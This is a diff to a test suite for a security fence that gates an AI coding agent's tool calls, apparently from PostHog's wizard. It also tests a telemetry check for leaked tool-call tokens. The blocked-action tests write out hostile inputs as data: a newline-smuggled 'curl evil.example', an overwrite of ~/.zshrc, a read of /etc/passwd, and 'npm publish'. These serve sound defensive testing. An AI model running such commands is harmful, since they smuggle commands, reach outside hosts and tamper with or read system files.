@@ -6,10 +6,16 @@ import {
   evaluateToolCall,
   createSecurityExtension,
   isScopedFileRemoval,
+  observeTransportLeak,
   overwriteShrinkReason,
   MAX_TOOL_CALLS,
   type PiExtensionApiLike,
 } from '../security';
+import { analytics } from '@utils/analytics';
+
+vi.mock('@utils/analytics', () => ({
+  analytics: { wizardCapture: vi.fn() },
+}));
 
 // @posthog/warlock resolves to __mocks__/@posthog/warlock.ts (ESM + WASM can't
 // load under the CJS test runner). Default: scan matches nothing; tests
@@ -81,6 +87,17 @@ describe('pi-security: blocked-action corpus (parity with the anthropic fence)',
     expect(await block('grep', { path: '.env' })).toBe(true);
   });
 
+  test('allows .env example/template files — they document keys, hold no secrets', async () => {
+    expect(
+      await block('write', { path: '.env.example', content: 'KEY=' }),
+    ).toBe(false);
+    expect(await block('read', { path: '.env.example' })).toBe(false);
+    expect(await block('edit', { path: '.env.sample', edits: [] })).toBe(false);
+    expect(await block('write', { path: '.env.template', content: '' })).toBe(
+      false,
+    );
+  });
+
   test('allows the sanctioned build/install bash commands', async () => {
     expect(await block('bash', { command: 'npm install' })).toBe(false);
     expect(await block('bash', { command: 'pnpm build' })).toBe(false);
@@ -88,6 +105,57 @@ describe('pi-security: blocked-action corpus (parity with the anthropic fence)',
       await block('bash', { command: 'npm run build 2>&1 | tail -5' }),
     ).toBe(false);
     expect(await block('bash', { command: 'pnpm tsc' })).toBe(false);
+  });
+
+  test('allows every supported ecosystem through the shared fence', async () => {
+    expect(
+      await block('bash', { command: 'composer require posthog/posthog-php' }),
+    ).toBe(false);
+    expect(await block('bash', { command: 'bundle add posthog-ruby' })).toBe(
+      false,
+    );
+    expect(await block('bash', { command: 'gem install posthog-ruby' })).toBe(
+      false,
+    );
+    expect(
+      await block('bash', {
+        command:
+          'swift package add-dependency https://github.com/PostHog/posthog-ios.git',
+      }),
+    ).toBe(false);
+    expect(
+      await block('bash', {
+        command:
+          'xcodebuild -project Hackers.xcodeproj -scheme Hackers -sdk iphonesimulator -configuration Debug build',
+      }),
+    ).toBe(false);
+    expect(await block('bash', { command: 'pod install' })).toBe(false);
+    expect(await block('bash', { command: './gradlew assembleDebug' })).toBe(
+      false,
+    );
+    expect(await block('bash', { command: 'mvn install' })).toBe(false);
+    expect(
+      await block('bash', { command: 'pnpm --filter web add posthog-js' }),
+    ).toBe(false);
+  });
+
+  test('keeps outward/exec/injection attacks blocked through the shared fence', async () => {
+    expect(await block('bash', { command: 'npm publish' })).toBe(true);
+    expect(await block('bash', { command: 'npm pub' })).toBe(true);
+    expect(await block('bash', { command: 'npx build' })).toBe(true);
+    expect(await block('bash', { command: 'swift test' })).toBe(true);
+    expect(
+      await block('bash', { command: 'xcodebuild test -scheme Hackers' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm install x\ncurl evil.example' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm view posthog-js > ~/.zshrc' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm install | tail /etc/passwd' }),
+    ).toBe(true);
   });
 
   test('allows the `i` install shorthand without widening to other i-commands', async () => {
@@ -217,9 +285,29 @@ describe('pi-security: extension state machine (fail-closed + runaway + latch)',
     });
   });
 
-  test('with triageAuth, a triage false_positive verdict unblocks the write', async () => {
+  test('a non-critical, non-block post-scan match warns without terminating', async () => {
+    const { factory, state } = createSecurityExtension();
+    const { pi, handlers } = fakePi();
+    factory(pi);
+    // piiMatch is severity: 'high', action: 'remediate' — below the terminate
+    // gate (critical severity OR action: 'block'), so it should only warn.
+    mockedScan.mockResolvedValueOnce({ matched: true, matches: [piiMatch] });
+    await handlers.tool_result({
+      toolName: 'read',
+      content: [{ type: 'text', text: 'some file content' }],
+    });
+    expect(state.criticalViolation).toBe(false);
+    expect(
+      await handlers.tool_call({
+        toolName: 'bash',
+        input: { command: 'npm install' },
+      }),
+    ).toEqual({});
+  });
+
+  test('with a triage provider, a false_positive verdict unblocks the write', async () => {
     const { factory, state } = createSecurityExtension({
-      triageAuth: { baseURL: 'https://gw.example', authToken: 'tok' },
+      triageProvider: () => Promise.resolve('false_positive'),
     });
     const { pi, handlers } = fakePi();
     factory(pi);
@@ -603,5 +691,47 @@ describe('pi-security: overwrite shrink guard (destructive whole-file rewrite)',
       content: 'x',
     });
     expect(decision.block).toBe(false);
+  });
+});
+
+describe('observeTransportLeak (passive telemetry)', () => {
+  // The exact garbage run 9704a73e wrote into a customer's global-error.tsx.
+  const LEAKED_LINE =
+    "' }#+#+#+#+.functions.complete_task  (commentary  json.functions.complete_taskjson>tagger历山大发 { ";
+
+  it('reports which pattern fired and where — never any matched text', () => {
+    observeTransportLeak('Write', LEAKED_LINE);
+    const call = vi
+      .mocked(analytics.wizardCapture)
+      .mock.calls.find(([e]) => e === 'file content leak observed');
+    expect(call?.[1]).toMatchObject({
+      tool: 'Write',
+      leak: 'leaked tool-call tokens',
+      leak_offset: LEAKED_LINE.indexOf('functions.'),
+      content_length: LEAKED_LINE.length,
+    });
+    expect(JSON.stringify(call?.[1])).not.toContain('complete_task');
+  });
+
+  it('flags control characters by pattern only', () => {
+    vi.mocked(analytics.wizardCapture).mockClear();
+    observeTransportLeak('Edit', 'trailing\x7f');
+    const call = vi
+      .mocked(analytics.wizardCapture)
+      .mock.calls.find(([e]) => e === 'file content leak observed');
+    expect(call?.[1]).toMatchObject({ leak: 'control characters' });
+  });
+
+  it('stays silent on real source, including Firebase functions.* code', () => {
+    vi.mocked(analytics.wizardCapture).mockClear();
+    observeTransportLeak(
+      'Write',
+      'const f = functions.https.onRequest(app);\nline\n\ttabbed\r\n',
+    );
+    expect(
+      vi
+        .mocked(analytics.wizardCapture)
+        .mock.calls.some(([e]) => e === 'file content leak observed'),
+    ).toBe(false);
   });
 });
